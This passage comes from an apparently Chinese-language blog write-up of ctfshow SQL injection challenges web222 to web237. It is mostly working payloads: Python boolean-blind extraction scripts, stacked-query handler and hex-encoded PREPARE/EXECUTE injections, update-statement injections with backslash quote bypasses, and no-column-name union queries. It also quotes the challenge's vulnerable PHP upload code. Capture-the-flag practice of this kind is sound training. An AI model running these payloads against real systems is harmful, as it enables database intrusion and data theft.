</span></span><span class=line><span class=cl>        <span class=c1># id,flagaabc,info</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;concat((if(ascii(substr((select flagaabc from ctfshow_flaga),</span><span class=si>{0}</span><span class=s2>,1))&lt;</span><span class=si>{1}</span><span class=s2>, 1, cot(0))), 1)&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(r.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;pass&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>时间盲注的脚本也是随便写，这里我就不写了</p><h2 id=web223>web223</h2><p>把数字过滤了，而且我好像写<code>cot(false)</code>也不能成功，换了一种payload，<code>if(true,username,'a')</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://2504134b-26db-45be-a355-a67ef4c37b8b.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>createNum</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=s1>&#39;true&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;true&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>+=</span> <span class=s2>&#34;+true&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span> <span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span><span class=o>+</span><span class=n>tail</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=n>position</span><span class=o>=</span><span class=n>createNum</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>Mid_True</span><span class=o>=</span><span class=n>createNum</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span><span class=o>+</span><span class=n>tail</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;if(ascii(substr((database()),{0},true))&lt;{1},username,false)&#34;.format(position,Mid_True)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),{0},true))&lt;{1},username,false)&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     position, Mid_True)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagas</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagas&#39;),{0},true))&lt;{1},username,false)&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     position, Mid_True)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flagasabc</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;if(ascii(substr((select flagasabc from ctfshow_flagas),</span><span class=si>{0}</span><span class=s2>,true))&lt;</span><span class=si>{1}</span><span class=s2>,username,false)&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>position</span><span class=p>,</span><span class=n>Mid_True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;u&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(r.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;passwordAUTO&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web224>web224</h2><p>访问<code>/robots.txt</code>，得到<code> /pwdreset.php</code>，上传恶意bin文件实现getshell，看文件知道注入的问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Return Code: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&lt;br /&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>10</span> <span class=o>*</span> <span class=mi>1024</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;文件过大: &#34;</span> <span class=o>.</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>/</span> <span class=mi>1024</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34; Kb&lt;br /&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34; already exists. &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filename</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>10000</span><span class=p>)))</span> <span class=o>.</span> <span class=s2>&#34;.zip&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filetype</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&#34;</span><span class=p>,</span> <span class=nv>$filetype</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;file type error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nv>$filepath</span> <span class=o>=</span> <span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO file(filename,filepath,filetype) VALUES (&#39;&#34;</span> <span class=o>.</span> <span class=nv>$filename</span> <span class=o>.</span> <span class=s2>&#34;&#39;,&#39;&#34;</span> <span class=o>.</span> <span class=nv>$filepath</span> <span class=o>.</span> <span class=s2>&#34;&#39;,&#39;&#34;</span> <span class=o>.</span> <span class=nv>$filetype</span> <span class=o>.</span> <span class=s2>&#34;&#39;);&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nv>$con</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=s2>&#34;localhost&#34;</span><span class=p>,</span> <span class=s2>&#34;root&#34;</span><span class=p>,</span> <span class=s2>&#34;root&#34;</span><span class=p>,</span> <span class=s2>&#34;ctf&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$con</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Could not connect: &#39;</span> <span class=o>.</span> <span class=nx>mysqli_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>mysqli_multi_query</span><span class=p>(</span><span class=nv>$con</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;location:filelist.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Error: &#34;</span> <span class=o>.</span> <span class=nv>$sql</span> <span class=o>.</span> <span class=s2>&#34;&lt;br&gt;&#34;</span> <span class=o>.</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$con</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$con</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>那这个闭合就完事了</p><h2 id=web225>web225</h2><p>SUCTF2019的一道题我记得是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=o>/</span><span class=n>api</span><span class=o>?</span><span class=n>username</span><span class=o>=-</span><span class=mi>1</span><span class=s1>&#39;;show tables;--+
</span></span></span><span class=line><span class=cl><span class=s1>/api?username=-1&#39;</span><span class=p>;</span><span class=n>handler</span><span class=w> </span><span class=o>`</span><span class=n>ctfshow_flagasa</span><span class=o>`</span><span class=w> </span><span class=n>open</span><span class=p>;</span><span class=n>handler</span><span class=w> </span><span class=o>`</span><span class=n>ctfshow_flagasa</span><span class=o>`</span><span class=w> </span><span class=k>read</span><span class=w> </span><span class=n>first</span><span class=p>;</span><span class=o>--+</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>还是比较S的姿势当时</p><h2 id=web226>web226</h2><p>使用<code>prepare</code>预编译一个语句，再<code>execute</code>执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73686f772020646174616261736573;execute abcd;#
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73686F77207461626C6573;execute abcd;#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;execute 
</span></span><span class=line><span class=cl>abcd;#
</span></span></code></pre></td></tr></table></div></div><h2 id=web227>web227</h2><p><code>Routines</code> 是information_schema中的一个表，存储所有存储过程和函数的定义信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>Routines</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>ROUTINE_NAME</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;sp_name&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E526F7574696E6573;execute 
</span></span><span class=line><span class=cl>abcd;#
</span></span></code></pre></td></tr></table></div></div><h2 id=web228>web228</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE a from 0x73656C656374202A2066726F6D2063746673685F6F775F666C616761736161
</span></span><span class=line><span class=cl>;execute a;#
</span></span></code></pre></td></tr></table></div></div><h2 id=web229>web229</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73686f772020646174616261736573;execute abcd;#
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73686F77207461626C6573;execute abcd;#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73656c656374202a2066726f6d20666c6167;execute 
</span></span><span class=line><span class=cl>abcd;#
</span></span></code></pre></td></tr></table></div></div><h2 id=web230>web230</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?username=-1&#39;;PREPARE abcd from 0x73656c656374202a2066726f6d20666c61676161626278;execute 
</span></span><span class=line><span class=cl>abcd;#
</span></span></code></pre></td></tr></table></div></div><h2 id=web231>web231</h2><p>路由是<code>/api/</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=err>$</span><span class=k>sql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s2>&#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>update注入，在改变密码的同时将username也改变，插入Sql语句</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=-1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=-1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;)#&amp;username=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=-1&#39;,username=(select flagas from flaga)#&amp;username=
</span></span></code></pre></td></tr></table></div></div><p>有个槽点就是这个东西只能慢慢的去看回显好像</p><p><img src=/p/ctfshow-sql-injection/QQ20250502-141333.jpg width=1485 height=898 loading=lazy alt=1></p><h2 id=web232>web232</h2><p>闭合md5即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=&#39;),username=(select  group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;)#&amp;username=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=&#39;),username=(select flagass from flagaa)#&amp;username=
</span></span></code></pre></td></tr></table></div></div><h2 id=web233>web233</h2><p>由于不能传入<code>'</code>，这里我们需要绕过一下，但是还是很简单，我们利用<code>\</code>将<code>'</code>转义即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=\&amp;username=,username=(select  group_concat(column_name) from information_schema.columns where table_name=&#39;flag233333&#39;)#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=\&amp;username=,username=(select flagass233 from flag233333)#
</span></span></code></pre></td></tr></table></div></div><h2 id=web234>web234</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=\&amp;username=,username=(select  group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=\&amp;username=,username=(select flagass23s3 from flag23a)#
</span></span></code></pre></td></tr></table></div></div><h2 id=web235>web235</h2><p>用<code>innodb_index_stats</code>和<code>innodb_table_stats</code>查找表名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
</span></span><span class=line><span class=cl>banlist,ctfshow_user,flag23a1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
</span></span></code></pre></td></tr></table></div></div><p>这么看的话可能不是很好看懂，我再写个无列名注入的payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=\&amp;username=,username=(select target_column from (SELECT 1, 2 AS target_column, 3 UNION SELECT * FROM flag23a1 limit 1,1)temp)#
</span></span></code></pre></td></tr></table></div></div><p>就很容易看懂了</p><h2 id=web236>web236</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_index_stats where database_name=database())#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,2)a)#
</span></span></code></pre></td></tr></table></div></div><h2 id=web237>web237</h2><p>注入点在<code>/api/insert.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=err>$</span><span class=k>sql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s2>&#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;</span><span class=p>;</span><span class=w>
